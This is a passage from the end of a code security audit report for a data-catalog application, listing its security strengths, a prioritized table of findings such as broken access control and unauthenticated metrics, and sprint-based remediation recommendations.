2. **SQL injection prevention** -- All database queries use SQLAlchemy ORM with parameterized queries. The Iceberg client validates identifiers against a safe pattern (`^[a-zA-Z0-9_.]+$`).

3. **Non-root Docker container** -- The production backend Dockerfile creates and uses a `appuser` (UID 1000) instead of root.

4. **OIDC implementation quality** -- The `OIDCClient` properly validates JWT signatures against JWKS, checks `exp`, `iss`, and `aud`/`azp` claims, handles key rotation, and supports dual-issuer for Docker/public URLs.

5. **Admin self-protection** -- The user management endpoints prevent self-demotion and last-admin removal (users.py lines 48-66).

6. **Structured audit logging** -- Security-relevant operations (grant creation/deletion, role changes) emit structured audit log entries.

7. **Markdown sanitization** -- The frontend uses `rehype-sanitize` with a whitelist-based schema when rendering user-supplied markdown, preventing stored XSS.

8. **Request ID tracing** -- Every request gets a UUID v4 `X-Request-ID` header, enabling security incident correlation across logs.

9. **Generic error responses** -- The global exception handler in `main.py` returns `"Internal server error"` without stack traces for unhandled exceptions.

10. **Dependency pinning** -- Backend uses `uv.lock` and `--frozen-lockfile`; frontend uses `pnpm-lock.yaml` and `--frozen-lockfile`, reducing supply chain risk.

---

## Remediation Priority

| Priority | Finding | Effort | Risk Reduction |
|----------|---------|--------|----------------|
| 1        | SEC-01 (Broken Access Control on Sub-Resources) | Medium | Very High |
| 2        | SEC-02 (Unauthenticated Metrics) | Low | High |
| 3        | SEC-03 (Cache Ignores Visibility) | Low | High |
| 4        | SEC-04 (Hardcoded Credentials) | Low | High |
| 5        | SEC-08 (Auth Bypass When SSO Disabled) | Low | High |
| 6        | SEC-06 (OpenAPI Exposed in Prod) | Low | Medium |
| 7        | SEC-05 (Frontend sed Injection) | Low | Medium |
| 8        | SEC-09 (Airflow HTTP Credentials) | Medium | Medium |
| 9        | SEC-07 (Exception Detail Leakage) | Low | Medium |
| 10       | SEC-15 (No TLS in Prod) | Medium | High |
| 11       | SEC-12 (AI Prompt Injection) | Medium | Medium |
| 12       | SEC-13 (Missing Headers on Assets) | Low | Low |
| 13-22    | Remaining LOW findings | Low | Low |

---

## Summary of Recommendations

**Immediate (within 1 sprint):**
- Fix SEC-01: Add visibility checks to all sub-resource endpoints
- Fix SEC-02: Add authentication to `/api/metrics`
- Fix SEC-03: Include user context in join suggestions cache key
- Fix SEC-04: Remove hardcoded credential defaults
- Fix SEC-06: Disable OpenAPI docs in production
- Fix SEC-08: Add startup guard for SSO-disabled production deployments

**Short-term (within 2-3 sprints):**
- Fix SEC-05: Validate or replace frontend runtime config injection
- Fix SEC-09: Enforce HTTPS for Airflow communication
- Fix SEC-15: Add TLS termination for production
- Fix SEC-12: Filter AI catalog context by user visibility
- Fix SEC-13: Fix nginx header inheritance for asset locations

**Ongoing:**
- Implement dependency vulnerability scanning in CI/CD (e.g., `pip audit`, `pnpm audit`)
- Add security-focused integration tests that verify visibility enforcement
- Conduct regular dependency updates and security reviews

---

*Report generated 2026-03-27. All findings verified against the source code at commit `750f030`.*
